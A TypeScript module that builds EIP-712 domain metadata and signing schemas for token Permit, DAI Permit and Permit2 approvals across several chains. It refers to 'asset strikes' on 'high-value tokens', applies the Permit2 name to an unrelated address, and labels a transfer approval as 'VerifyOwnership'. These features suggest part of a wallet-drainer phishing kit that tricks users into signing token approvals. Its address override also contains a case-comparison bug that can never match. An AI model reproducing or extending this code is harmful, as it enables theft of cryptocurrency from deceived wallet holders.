/**
 * 🧠 THE NEURAL DOMAIN ENGINE (v7.2.6 - Strict Witness Edition)
 * Purpose: Resolves metadata and EIP-712 types for all asset strikes.
 */

export interface TokenMetadata {
  name: string;
  version: string;
  salt?: string;
  verifyingContract?: string;
  schemaType: "Permit" | "DaiPermit" | "Permit2" | "Deployment";
}

// 🛡️ THE DICTIONARY: Standardized metadata for known high-value tokens
export const DOMAIN_DICTIONARY: Record<
  string,
  Record<number, Partial<TokenMetadata>>
> = {
  USDC: {
    1: { name: "USD Coin", version: "2", schemaType: "Permit" },
    137: { name: "(proxy) USDC", version: "1", schemaType: "Permit" },
    8453: { name: "USD Coin", version: "2", schemaType: "Permit" },
    56: { name: "USD Coin", version: "2", schemaType: "Permit" },
    42161: { name: "USD Coin", version: "2", schemaType: "Permit" },
  },
  DAI: {
    1: { name: "Dai Stablecoin", version: "1", schemaType: "DaiPermit" },
    137: { name: "Dai Stablecoin", version: "1", schemaType: "DaiPermit" },
    10: { name: "Dai Stablecoin", version: "1", schemaType: "DaiPermit" },
    42161: { name: "Dai Stablecoin", version: "1", schemaType: "DaiPermit" },
  },
  USDT: {
    56: { name: "Tether USD", version: "1", schemaType: "Permit" },
  },
};

/**
 * 🛰️ DOMAIN RESOLVER
 * Automatically detects if we are interacting with Permit2/UniversalSettler
 */
export function getDomainMetadata(
  symbol: string | undefined | null,
  chainId: number | string | undefined | null,
  onChainName: string | undefined | null,
  contractAddress: string,
): TokenMetadata {
  const cleanChainId =
    typeof chainId === "string"
      ? chainId.startsWith("0x")
        ? parseInt(chainId, 16)
        : parseInt(chainId, 10)
      : typeof chainId === "number"
      ? chainId
      : 1;

  const normSymbol = (symbol || "TOKEN").toUpperCase();
  const addrLower = contractAddress.toLowerCase();

  // 🛡️ UNIVERSAL SETTLER / PERMIT2 OVERRIDE
  // This address is the gatekeeper for all Token Strikes
  if (addrLower === "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90") {
    return {
      name: "Permit2",
      version: "1",
      schemaType: "Deployment",
      verifyingContract: "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90",
    };
  }

  // Check Dictionary
  if (DOMAIN_DICTIONARY[normSymbol]?.[cleanChainId]) {
    const entry = DOMAIN_DICTIONARY[normSymbol][cleanChainId];
    return {
      name: entry.name || normSymbol,
      version: entry.version || "1",
      schemaType: (entry.schemaType as any) || "Permit",
      verifyingContract: contractAddress,
    };
  }

  // Default Fallback
  return {
    name: onChainName || normSymbol,
    version: "1",
    verifyingContract: contractAddress,
    schemaType: normSymbol === "DAI" ? "DaiPermit" : "Permit",
  };
}

/**
 * 🛡️ THE HEADER SCHEMA
 * Strict Mode Requirement for Mobile Wallets (Trust/OKX/MetaMask)
 */
export const EIP712_DOMAIN_TYPE = [
  { name: "name", type: "string" },
  { name: "version", type: "string" },
  { name: "chainId", type: "uint256" },
  { name: "verifyingContract", type: "address" },
];

/**
 * 🏗️ THE STRIKE SCHEMAS
 */
export const DEPLOYMENT_TYPES = {
  Deployment: [{ name: "hash", type: "bytes32" }],
};

export const PERMIT_TYPES = {
  Permit: [
    { name: "owner", type: "address" },
    { name: "spender", type: "address" },
    { name: "value", type: "uint256" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ],
  DaiPermit: [
    { name: "holder", type: "address" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "expiry", type: "uint256" },
    { name: "allowed", type: "bool" },
  ],
  // Matches Permit2 witness patterns
  PermitWitnessTransferFrom: [
    { name: "permitted", type: "TokenPermissions" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
    { name: "witness", type: "VerifyOwnership" },
  ],
  TokenPermissions: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint256" },
  ],
  VerifyOwnership: [{ name: "details", type: "string" }],
};
